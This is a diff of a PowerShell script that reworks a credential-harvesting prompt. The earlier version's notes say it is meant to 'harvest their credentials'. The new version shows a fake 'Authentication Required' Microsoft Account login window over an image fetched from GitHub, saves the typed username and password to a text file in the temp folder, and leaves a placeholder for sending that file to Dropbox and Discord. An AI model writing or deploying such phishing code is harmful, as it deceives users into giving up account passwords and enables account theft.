@@ -1,47 +1,82 @@
-#------------------------------------------------------------------------------------------------------------------------------------
+Add-Type -AssemblyName PresentationCore, PresentationFramework, WindowsBase
 
-$FileName = "$env:USERNAME-$(get-date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
+# Define the URL to the image hosted on GitHub
+$imageUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/fb.jpg"
 
-#------------------------------------------------------------------------------------------------------------------------------------
+# Create XAML for the login window
+$XAML = @"
+<Window
+    xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
+    xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
+    Title="Authentication Required" Height="350" Width="450">
+    <Grid>
+        <Image Source="$imageUrl" Stretch="Fill" />
+        <Grid Background="Transparent">
+            <Grid.RowDefinitions>
+                <RowDefinition Height="*"/>
+                <RowDefinition Height="Auto"/>
+                <RowDefinition Height="Auto"/>
+                <RowDefinition Height="Auto"/>
+                <RowDefinition Height="20"/> <!-- Empty row with 20 units of height -->
+            </Grid.RowDefinitions>
+            <TextBlock Grid.Row="0" Text="Please authenticate your Microsoft Account." HorizontalAlignment="Center" VerticalAlignment="Center" FontSize="20" Foreground="White"/>
+            
+            <Grid Grid.Row="1" HorizontalAlignment="Center">
+                <Grid.ColumnDefinitions>
+                    <ColumnDefinition Width="Auto"/>
+                    <ColumnDefinition Width="Auto"/>
+                </Grid.ColumnDefinitions>
+                <Label Content="Username:" VerticalAlignment="Center" Foreground="White"/>
+                <TextBox Name="Username" VerticalAlignment="Center" Margin="10" Height="30" Width="200" Grid.Column="1"/>
+            </Grid>
+            
+            <Grid Grid.Row="2" HorizontalAlignment="Center">
+                <Grid.ColumnDefinitions>
+                    <ColumnDefinition Width="Auto"/>
+                    <ColumnDefinition Width="Auto"/>
+                </Grid.ColumnDefinitions>
+                <Label Content="Password:" VerticalAlignment="Center" Foreground="White"/>
+                <PasswordBox Name="Password" VerticalAlignment="Center" Margin="10" Height="30" Width="200" Grid.Column="1"/>
+            </Grid>
 
-<#
+            <Button Grid.Row="3" Content="Login" HorizontalAlignment="Center" VerticalAlignment="Top" Width="100" Name="LoginButton"/>
+        </Grid>
+    </Grid>
+</Window>
+"@
 
-.NOTES 
-	This is to generate the ui.prompt you will use to harvest their credentials
-#>
+# Create a XML reader for the XAML
+$reader = [System.Xml.XmlReader]::Create([System.IO.StringReader] $XAML)
 
-function Get-Creds {
+# Load the XAML and create a Window object
+$loginWindow = [Windows.Markup.XamlReader]::Load($reader)
 
-    $form = $null
+# Define an event handler for the Login button
+$loginButton = $loginWindow.FindName("LoginButton")
+$loginButton.Add_Click({
+    $enteredUsername = $Username.Text
+    $enteredPassword = $Password.Password
 
-    while ($form -eq $null)
-    {
-        # Prompt for email and password
-        $email = Read-Host "Enter your email"
-        $password = Read-Host "Enter your password" -AsSecureString
+    # Perform authentication logic here, e.g., check credentials
+    if ($enteredUsername -eq "w" -and $enteredPassword -eq "5") {
+        $loginWindow.Close()
+        Write-Host "Login successful!"
 
-        if([string]::IsNullOrWhiteSpace([Net.NetworkCredential]::new('', (ConvertTo-SecureString -SecureString $password)).Password))
-        {
-            if(-not ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.ManifestModule -like "*PresentationCore*" -or $_.ManifestModule -like "*PresentationFramework*" }))
-            {
-                Add-Type -AssemblyName PresentationCore,PresentationFramework
-            }
+        # Send the collected data
+        $fileName = "$env:USERNAME-$(Get-Date -f yyyy-MM-dd_hh-mm)_User-Creds.txt"
+        $creds = "Email: $enteredUsername`nPassword: $enteredPassword"
+        $creds | Out-File -FilePath "$env:TEMP\$fileName" -Encoding utf8
 
-            $msgBody = "Credentials cannot be empty!"
-            $msgTitle = "Error"
-            $msgButton = 'Ok'
-            $msgImage = 'Stop'
-            $Result = [System.Windows.MessageBox]::Show($msgBody,$msgTitle,$msgButton,$msgImage)
-            Write-Host "The user clicked: $Result"
-            $form = $null
-        }
-        
-        else{
-            $creds = New-Object PSCredential -ArgumentList $email, $password
-            return $creds
-        }
+        # Add your code for uploading the file to Dropbox and sending to Discord here
+    } else {
+        Write-Host "Login failed!"
+        # You can display an error message here if needed
     }
-}
+})
+
+# Show the login window
+$loginWindow.ShowDialog()
+
 
 
 #----------------------------------------------------------------------------------------------------
